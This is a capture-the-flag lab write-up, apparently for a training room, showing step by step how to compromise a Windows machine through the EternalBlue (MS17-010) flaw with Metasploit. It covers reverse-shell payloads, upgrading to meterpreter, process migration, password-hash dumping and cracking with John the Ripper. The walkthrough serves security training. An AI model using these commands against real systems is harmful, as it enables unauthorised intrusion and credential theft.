Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

<!--more-->

## Task 1

Scan the machine for open ports and vulnerabilities using nmap.

```
nmap -sVC --script vuln  10.10.91.185
```

<img src="images/02.Blue/02.png">

From the scan results we can see that the machine is vulnerable to ms17-010.

## Task 2

Let's open metasploit.

```
msfconsole -q
```

Search for the exploit ms17-010 and use exploit/windows/smb/ms17_010_eternalblue.

```
search ms17-010
```

```
use 0
```

### Approach 1

The payload is set by default to windows/x64/meterpreter/reverse tcp.

See the available options and change the rport and lhost.

```
show options
```

```
set rhosts 10.10.91.185
```

```
set lhost tun0
```

<img src="images/02.Blue/04.png">

Run the exploit.

```
exploit
```

We now got a meterpreter shell. Let's quickly find out the information about the machine. We are logged in as nt authority\system. Now we have all privileges to the machine.

### Approach 2

Set the payload to windows/x64/shell/reverse_tcp.

```
set payload windows/x64/shell/reverse_tcp
```
See the available options and change the rport and lhost.

```
show options
```

```
set rhosts 10.10.91.185
```

```
set lhost tun0
```

<img src="images/02.Blue/07.png">

Run the exploit.

```
exploit
```
We now got a shell and we will elevate this shell to meterpreter shell. Background the shell by hitting Ctrl+Z.

<img src="images/02.Blue/08.png">

Use the module post/multi/manage/shell_to_meterpreter to get a meterpreter shell from the existing non-meterpreter shell.

Set lhost, session and run it.

```
set lhost tun0
```

```
set session 2
```

```
exploit
```

## Task 3

Let's check whether we are running as nt authority\system or not using getsystem.

```
getsystem
```

We are already running as SYSTEM and run ps to list all the processes.

```
ps
```

We will now migrate to a different process that is running as NT AUTHORITY\SYSTEM.

```
migrate 704
```

## Task 4

We can run hashdump in the meterpreter shell to get the hashes.

Then we will crack the hash of user Jon with John The Ripper.

```
john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

## Task 5

Now let's find the flags. The first flag is located in the location C:\ .

The second flag is located at the location where passwords are stored. The passwords are stored in SAM file. So, the second flag would be in the location C: \windows\system32\config.

The third flag is located in the Documents folder of the user Jon.
